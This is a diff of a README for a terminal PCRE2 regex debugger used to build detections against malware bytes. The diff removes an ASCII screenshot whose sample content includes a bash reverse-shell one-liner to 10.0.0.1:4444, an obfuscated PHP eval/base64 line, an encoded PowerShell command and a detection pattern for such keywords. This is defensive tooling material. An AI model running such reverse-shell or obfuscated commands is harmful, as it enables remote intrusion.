@@ -6,24 +6,7 @@ Do not run this application in an environment where security is a priority. Revi
 
 A terminal UI PCRE2 regex debugger for developing detections against raw byte content — malware samples, shellcode, mixed encodings, binary blobs. Type a pattern, see every match highlighted in the file, inspect capture groups by byte offset.
 
-```
-┌Pattern  (Tab = content  F1 = help)─────────────────────┐
-│(?i)(bin|exec|eval|powershell)                          │
-└────────────────────────────────────────────────────────┘
- Modifiers: (?i) caseless  (?m) multiline  (?s) dotall  (?x) extended  (?U) ungreedy  (?u) utf+ucp
-┌Content  [343 bytes]────────────────────────────────────┐
-│GET /admin/passwd HTTP/1.1\x0D                          │
-│#!/bin/bash                                             │
-│exec /bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1         │
-│eval(base64_decode("c3lzdGV..."));                      │
-│powershell -enc JABjAD0ATgB...                          │
-└────────────────────────────────────────────────────────┘
-┌Match info──────────────────────────────────────────────┐
-│Match 3/5  offset 101  len 4                            │
-│  \1  [101-105]  eval                                   │
-└────────────────────────────────────────────────────────┘
- sample.bin  [BYTE]  line 1/11  5 matches
-```
+![TUI](images/screen1.png)
 
 ## Requirements
 
